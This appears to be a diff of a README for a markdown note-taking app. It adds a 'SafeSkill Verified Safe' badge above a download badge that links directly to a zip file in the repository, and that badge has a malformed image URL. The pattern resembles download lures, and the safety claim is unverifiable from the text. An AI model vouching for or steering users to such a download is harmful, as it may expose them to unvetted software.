@@ -1,5 +1,7 @@
 # 📝 markdown-note-app - Your Easy Markdown Note-Taking Solution
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/voxanne1478-markdown-note-app)
+
 [![Download markdown-note-app](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip%20Now-%20-orange)](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip)
 
 ## 🚀 Getting Started
